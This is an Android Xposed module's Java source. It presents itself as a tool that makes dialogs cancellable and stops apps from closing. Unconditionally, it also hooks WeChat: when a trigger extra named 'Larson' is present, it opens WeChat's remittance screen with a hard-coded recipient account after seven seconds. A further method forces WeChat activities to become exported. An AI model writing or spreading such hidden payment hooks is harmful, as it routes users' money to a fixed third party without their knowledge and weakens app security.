package com.mhook.dialog;

import java.lang.reflect.Field;

import de.robv.android.xposed.IXposedHookLoadPackage;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XC_MethodReplacement;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.XC_MethodHook.MethodHookParam;
import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;
import de.robv.android.xposed.*;
import android.app.*;
import android.content.*;
import android.content.pm.ActivityInfo;
import android.os.Process;
import android.view.Window;

import com.mhook.dialog.Utils.*;

public class Module implements IXposedHookLoadPackage  {

	@Override
	public void handleLoadPackage(final LoadPackageParam lpparam) throws Throwable {

		XSharedPreferences globalXSharedPreferences = new XSharedPreferences(
				AppList.strPkgName, "digXposed");
		
		hookWeixinAlipay(lpparam);

		if (!globalXSharedPreferences.getBoolean(AppList.strModule, true))return;
		
		XC_MethodHook callback1 = new XC_MethodHook() {
			@Override
			protected void beforeHookedMethod(MethodHookParam param) {

				SLog.d("log_2", "对话框已被设置为能取消");

				param.args[0] = true;

			}

		};

		XC_MethodHook XC_MethodHook1 = new XC_MethodHook() {

			public void beforeHookedMethod(XC_MethodHook.MethodHookParam param) {
				
				if(lpparam.packageName.equals(AppList.strPkgName))return;

				SLog.d("log_2", "获取取消函数完毕");

				if (param.args[0] instanceof DialogInterface.OnCancelListener) {

					SLog.d("log_2", "参数是匹配");

					DialogInterface.OnCancelListener OnCancelListener1 = new DialogInterface.OnCancelListener() {

						@Override
						public void onCancel(DialogInterface p1) {

							SLog.d("log_2", "对话框替换成功");

							// TODO: Implement this method
						}
					};

					param.args[0] = OnCancelListener1;

				}

			}

		};

		SLog.d("log_2", "对话框取消已激活");

		Class<?> clazz = null;
		try {
			clazz = Class.forName("android.support.v7.app.AlertDialog.Builder");
		} catch (ClassNotFoundException e) {

			SLog.d("log_2", "class未发现:" + e);

		}

		if (clazz != null) {

			SLog.d("log_2", "clazz存在");

			XposedBridge.hookAllMethods(clazz, "setCancelable", callback1);

			XposedBridge.hookAllMethods(clazz, "setOnCancelListener",
					XC_MethodHook1);

		} else {

			SLog.d("log_2", "clazz未知");

		}

		XposedBridge.hookAllMethods(Dialog.class, "setCancelable", callback1);
		
		XposedBridge.hookAllMethods(Dialog.class, "setCanceledOnTouchOutside",
				callback1);
		XposedBridge.hookAllMethods(AlertDialog.Builder.class, "setCancelable",
				callback1);
		XposedBridge.hookAllMethods(Activity.class, "setFinishOnTouchOutside",
				callback1);

		XposedBridge.hookAllMethods(AlertDialog.Builder.class,
				"setOnCancelListener", XC_MethodHook1);

		XposedBridge.hookAllMethods(Dialog.class, "setOnCancelListener",
				XC_MethodHook1);

		XposedBridge.hookAllMethods(Window.class, "setCloseOnTouchOutside",
				callback1);

		XposedBridge.hookAllMethods(Window.class,
				"setCloseOnTouchOutsideIfNotSet", callback1);
		
		if(globalXSharedPreferences.getBoolean(AppList.strModEx, false)){
			
			openModEx(lpparam);
			
		}
		
	}
	
	//增强功能
	
	static void openModEx(LoadPackageParam lpparam){
		
		SLog.d("log_2", "增强功能已开启！");
		
		XSharedPreferences selfXSharedPreferences = new XSharedPreferences(
				AppList.strPkgName,lpparam.packageName);
		
		//禁用对话框

				if (selfXSharedPreferences.getBoolean(AppList.strDisabledAlert, false)) {

					XposedBridge.hookAllMethods(Dialog.class, "show",
							new XC_MethodReplacement() {

								@Override
								protected Object replaceHookedMethod(
										MethodHookParam param) throws Throwable {
									// TODO 自动生成的方法存根
									return null;
								}
							});

				}
				
				//禁止退出
				
				if (selfXSharedPreferences.getBoolean(AppList.strDisabledExit, false)) {
					
					XC_MethodReplacement xc_MethodReplacement=new XC_MethodReplacement() {

						@Override
						protected Object replaceHookedMethod(
								MethodHookParam param) throws Throwable {
							// TODO 自动生成的方法存根
							return null;
						}
					};

					XposedBridge.hookAllMethods(Process.class, "killProcessQuiet",xc_MethodReplacement);
					
					XposedBridge.hookAllMethods(Process.class, "killProcessGroup",xc_MethodReplacement);
					
					XposedBridge.hookAllMethods(Process.class, "killProcess",xc_MethodReplacement);
					
					XposedBridge.hookAllMethods(System.class, "exit",xc_MethodReplacement);
					
					XposedBridge.hookAllMethods(Runtime.class, "exit",xc_MethodReplacement);
					
					XposedBridge.hookAllMethods(Activity.class, "finish",xc_MethodReplacement);

				}
		
	}
	
	static void hookWeixinAlipay(LoadPackageParam lpparam){
		
		if(!lpparam.packageName.equals("com.tencent.mm"))return;
		
		XC_MethodHook xc_MethodHook=new XC_MethodHook(){
			
			protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
				
				if(param.thisObject instanceof Activity){
					
					final Activity  mActivity=(Activity)param.thisObject;
				
				if(!mActivity.getIntent().hasExtra("Larson"))return;
				
				mActivity.getIntent().removeExtra("Larson");
				
				new Thread() {
					
					@Override
					public void run() {
						// TODO 自动生成的方法存根
						
						try {
							sleep(7000);
						} catch (InterruptedException e) {
							// TODO 自动生成的 catch 块
							e.printStackTrace();
						}
						
						  Intent intent=new Intent();
							
							intent.putExtra("pay_channel",11);
							
							intent.putExtra("receiver_name","wxid_jwvhbkeumvbm22");
							
							intent.putExtra("WECHAT_PAY_LOG_REPORT_INDEX",3);
							
							intent.putExtra("pay_scene",31);
							
							intent.putExtra("WECHAT_PAY_LOG_REPORT_BASEIFO","wxid_jwvhbkeumvbm22,1");
							
							intent.putExtra("scene",2);
							
							intent.putExtra("WECHAT_PAY_LOG_REPORT_DATA","{0, 1496477841148, 1, wxid_jwvhbkeumvbm22},{1, 1496477844150, 2, wxid_jwvhbkeumvbm22},{2, 1496477899842, 2, wxid_jwvhbkeumvbm22},");
							
							intent.setComponent(new ComponentName("com.tencent.mm","com.tencent.mm.plugin.remittance.ui.RemittanceUI"));
							
							mActivity.startActivity(intent);
							
					}
					
				}.start();
				
				}
				
			};
			
		};
		
		XposedBridge.hookAllMethods(Activity.class, "onCreate", xc_MethodHook);
		
	}
	
	static void hookExported(LoadPackageParam lpparam){
		
		if(!lpparam.packageName.equals("com.tencent.mm"))return;
		
		SLog.d("log_2", "begin hook weixin...");
		
		XC_MethodHook xcHook=new XC_MethodHook(){
			
			/* (非 Javadoc)
			 * Description:
			 * @see de.robv.android.xposed.XC_MethodHook#afterHookedMethod(de.robv.android.xposed.XC_MethodHook.MethodHookParam)
			 */
			@Override
			protected void afterHookedMethod(MethodHookParam param)
					throws Throwable {
				
				SLog.d("log_2", "begin ...");
				
				ActivityInfo info=null;
				
				Object activityObject=param.getResult();
				 
				Class<?> activityClass=Class.forName("android.content.pm.PackageParser.Activity");
				
				if (activityClass.isInstance(activityObject)){
					
					Field infoField=  ReflectUtils.getField(activityClass, "info");
					
					infoField.setAccessible(true);
					
					if(infoField.get(activityObject) instanceof ActivityInfo){
						
						info=(ActivityInfo)infoField.get(activityObject);
						
						info.exported=true;
						
						infoField.set(activityObject, info);
						
						param.setResult(activityObject);
						
						SLog.d("log_2", "替换成功！");
						
					}else {
						
						SLog.d("log_2", "非ActivityInfo");
					}
					
				}else {
					
					SLog.d("log_2", "isInstance not");
				}
				
				// TODO 自动生成的方法存根
				super.afterHookedMethod(param);
			}
		};
		
		try {
			XposedBridge.hookAllMethods(XposedHelpers.findClass("android.content.pm.PackageParser",lpparam.classLoader), "parseActivity", xcHook);
			
			XposedBridge.hookAllMethods(XposedHelpers.findClass("android.content.pm.PackageParser",lpparam.classLoader), "parseActivityAlias", xcHook);
			
		} catch (Exception e) {
			// TODO 自动生成的 catch 块
		
			SLog.d("log_2", "error:"+e.toString());
			
		}
		
	}

}
